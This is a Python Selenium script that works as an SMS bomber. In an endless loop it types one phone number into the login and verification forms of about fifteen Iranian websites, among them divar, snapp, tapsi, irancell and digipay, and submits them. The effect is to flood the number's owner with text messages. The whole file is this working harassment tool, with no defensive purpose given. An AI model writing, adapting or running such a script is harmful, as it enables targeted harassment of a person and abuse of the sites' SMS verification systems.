from selenium import webdriver
from selenium.webdriver.common.by import By
from time import sleep
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.chrome.options import Options
global forone
global driver
global actions
fServic = webdriver.FirefoxService(executable_path="geckodriver")
driver = webdriver.Firefox(service=fServic)
actions = ActionChains(driver)   
# u = str(input("Enter num :"))
forone = 0

u = "Number"

def taaghche(number):
    try :
        driver.get("https://taaghche.com/login")
        driver.find_element(By.NAME, 'test').send_keys(number)
        # sleep(2)
        driver.find_element(By.CLASS_NAME, "loading_button__njwsk").click()
    except :
        pass
def ostadkar(number):
    try :
        driver.get("https://ostadkar.ir/")
        driver.find_element(By.CLASS_NAME, "ods-btn.btn-small").click()
        driver.find_element(By.NAME, 'mobile').send_keys(number)
        # sleep(2)
        driver.find_element(By.CLASS_NAME, "ods-login-modal__btn").click()
    except :
        pass

def vendar(number):
    try:
        driver.get("https://account.vandar.io/?callback=https%3A%2F%2Fdash.vandar.io%2F")
        # driver.find_element(By.CLASS_NAME, "ods-btn.btn-small").click()
        driver.find_element(By.ID, 'input-21').send_keys(number)
        # sleep(2)
        driver.find_element(By.CLASS_NAME, "v-btn").click()
        
    except :
        pass

def trob(number):
    try:
        driver.get("https://torob.com/login")
        # driver.find_element(By.CLASS_NAME, "ods-btn.btn-small").click()
        driver.find_element(By.NAME, 'phone_number').send_keys(number)
        # sleep(2)
        driver.find_element(By.CLASS_NAME, "submit-btn").click()
        
    except :
        pass

def mart(number):
    try:
        driver.get("https://beroozmart.com/login")
        
        # driver.find_element(By.CLASS_NAME, "ods-btn.btn-small").click()
        driver.find_element(By.NAME, 'شماره موبایل').send_keys(number)
        # sleep(2)
        driver.find_element(By.CSS_SELECTOR, ".mb-3, .my-3").click()
        

        
    except :
        pass

def miare(number):
    try:
        driver.get("https://www.miare.ir/p/driver/#/login?next=/register/personal-info")
        
        # driver.find_element(By.CLASS_NAME, "ods-btn.btn-small").click()
        driver.find_element(By.NAME, 'phone').send_keys(number)
        # sleep(2)
        driver.find_element(By.CSS_SELECTOR, ".milingo-btn-wrapper").click()
        

        
    except :
        pass

def digipay(number):
    try:
        driver.get("https://app.mydigipay.com/auth/login")
        
        # driver.find_element(By.CLASS_NAME, "ods-btn.btn-small").click()
        driver.find_element(By.CSS_SELECTOR, 'input').send_keys(number)
        # sleep(2)
        driver.find_element(By.CSS_SELECTOR, ".digipay-btn").click()

        

        
    except :
        pass

def divar(number):
    try:
        driver.get("https://divar.ir/s/tehran")
        
        # 
        driver.find_element(By.CSS_SELECTOR, '.kt-nav-button--small').click()
        driver.find_element(By.CSS_SELECTOR, '.navbar-my-divar__button-item').click()
        driver.find_element(By.NAME, "mobile").send_keys(number)

        
    except :
        pass

def irancel(number):
    try :    
        if (forone  <=1): 
            try:
                driver.get("https://login.irancell.ir/signin?redirect_uri=https://shop.irancell.ir/fa/sso")
                
                # 
                driver.find_element(By.ID, 'username-input').send_keys(number)
                driver.find_element(By.NAME, 'check_user_next').click()
                forone = forone + 1 
                  
            except :
                pass
    except :
        pass

def snapp(number):
    try:
        driver.get("https://digitalsignup.snapp.ir/?utm_source=snapp.ir&utm_medium=website-button&utm_campaign=menu")
        
        # sleep(2)

        driver.find_element(By.CSS_SELECTOR, '.innerTag-d0-0-2-39').send_keys(number)

        driver.find_element(By.CSS_SELECTOR ,'.buttonBase-d2-0-2-59').click()
        

        
    except :
        pass

def tapsi(number):
    try:
        driver.get("https://pack.tapsi.ir/login")
        
        # sleep(2)

        driver.find_element(By.ID, 'mui-1').send_keys(number)

        driver.find_element(By.CSS_SELECTOR ,'.muirtl-1sc9dbk').click()
        

        
    except :
        pass

def tapsi2(number):
    try:
        driver.get("https://app.tapsi.cab")
        
        # sleep(2)

        driver.find_element(By.CSS_SELECTOR, '.form-field__input').send_keys(number)

        driver.find_element(By.CSS_SELECTOR ,'.BottomButton-container.primary').click()
        

        
    except :
        pass

def basalam(number):
    try:
        driver.get("https://basalam.com/accounts?prev=%2Fdiscovery")
        
        # sleep(2)
        
        driver.find_element(By.ID, 'bs_input__30').send_keys(number)

        driver.find_element(By.CSS_SELECTOR ,'.bs-button.bs-button-fill').click()
        

        
    except :
        pass

def drnext(number):
    try:
        driver.get("https://panel.drnext.ir/auth/register")
        
        # sleep(2)
        
        driver.find_element(By.ID, '_auth_login_step_one_input_mobile').send_keys(number)

        driver.find_element(By.NAME ,'button').click()
        

        
    except :
        pass

def shad(number):
    try:
        driver.get("https://web.shad.ir/#/login")
        
        # sleep(2)
        
        driver.find_element(By.NAME, 'phone_number').send_keys(number)

        driver.find_element(By.CSS_SELECTOR ,'.page-sign .btn-primary').click()
        

        
    except :
        pass

sites = [taaghche, ostadkar, vendar, trob, mart, miare, divar, snapp, tapsi, tapsi2, basalam, drnext, shad, digipay, irancel]
print(len(sites))  

while 1: 
    for i in sites:
        try :
            i(u)        
        except :
            pass